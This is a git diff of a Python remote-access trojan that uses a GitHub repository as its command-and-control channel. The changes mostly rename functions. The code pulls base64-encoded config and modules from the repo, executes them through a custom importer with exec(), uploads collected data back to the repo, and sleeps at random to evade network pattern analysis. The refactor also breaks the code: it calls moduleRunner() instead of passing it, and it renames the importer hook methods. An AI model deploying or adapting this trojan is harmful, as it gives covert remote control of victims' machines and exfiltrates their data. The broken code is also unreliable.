@@ -1,13 +1,10 @@
-import os
-import queue
-import threading
-import random
-import importlib
 import time
 import sys
 import base64
 import json
-
+import queue
+import threading
+import random
 import types
 
 from github3 import login
@@ -24,18 +21,18 @@ password = "Whatever my github password is"
 
 
 # authenticates the user and gets repo and branch objects
-def connect_to_github():
-    gh = login(username="AlaexanderStocks", password="password")
-    repo = gh.repository("AlexanderStocks", "Networking-RemoteTrojanControl")
-    branch = repo.branch("master")
+def connectToGithub():
+    github = login(username="AlexanderStocks", password=password)
+    repo = github.repository("AlexanderStocks", "Networking-RemoteTrojanControl")
+    currentBranch = repo.branch("master")
 
-    return gh, repo, branch
+    return github, repo, currentBranch
 
 
 # grabs files then read contents locally
-def get_file_contents(filepath):
-    gh, repo, branch = connect_to_github()
-    tree = branch.commit.commit.tree.recurse()
+def getFileContents(filepath):
+    github, repo, currentBranch = connectToGithub()
+    tree = currentBranch.commit.commit.tree.recurse()
 
     for filename in tree.tree:
 
@@ -47,10 +44,10 @@ def get_file_contents(filepath):
 
 
 # retrieves remote config document from repo
-def get_trojan_config():
+def getTrojanConfig():
     global configured
-    config_json = get_file_contents(trojanConfig)
-    config = json.loads(base64.b64decode(config_json))
+    configJson = getFileContents(trojanConfig)
+    config = json.loads(base64.b64decode(configJson))
     configured = True
 
     for task in config:
@@ -60,48 +57,49 @@ def get_trojan_config():
 
 
 # push collected data
-def store_module_result(data):
-    gh, repo, branch = connect_to_github()
-    remote_path = "data/%s/%d.data" % (trojanId, random.randint(1000, 100000))
-    repo.create_file(remote_path, "Storing module result", base64.b64encode(data))
+def storeModuleResult(data):
+    github, repo, currentBranch = connectToGithub()
+    remotePath = "data/%s/%d.data" % (trojanId, random.randint(1000, 100000))
+    repo.create_file(remotePath, "Storing module result", base64.b64encode(data))
 
     return
 
 
 class GitImporter(object):
     def __init__(self):
-        self.current_module_code = ""
+        self.currentModuleCode = ""
 
-    def find_module(self, fullname, path=None):
+    def findModule(self, fullname, path=None):
         if configured:
             print("[*] Attempting to retrieve %s" % fullname)
-            new_library = get_file_contents("modules/%s" % fullname)
+            newLibrary = getFileContents("modules/%s" % fullname)
 
-            if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
+            if newLibrary is not None:
                 # tells interpreter the module has been found and it can then load it
+                self.currentModuleCode = base64.b64decode(newLibrary)
+                
                 return self
 
         return None
 
-    def load_module(self, name):
+    def loadModule(self, name):
         # create a blank module
         module = types.ModuleType(name)
         # put code from module we found into our new blank module
-        exec(self.current_module_code, module.__dict__)
+        exec(self.currentModuleCode, module.__dict__)
         # insert new module into sys.modules so picked up by future import calls
         sys.modules[name] = module
 
         return module
 
 
-def module_runner(module):
+def moduleRunner(module):
     taskQueue.put(1)
     result = sys.modules[module].run()
     taskQueue.get()
 
     # store result in repo
-    store_module_result(result)
+    storeModuleResult(result)
 
     return
 
@@ -112,10 +110,10 @@ while True:
 
     if taskQueue.empty():
 
-        config = get_trojan_config()
+        config = getTrojanConfig()
 
         for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t = threading.Thread(target=moduleRunner(), args=(task['module'],))
             t.start()
             # sleep to hide from network pattern analysis tools
             time.sleep(random.randint(1, 10))
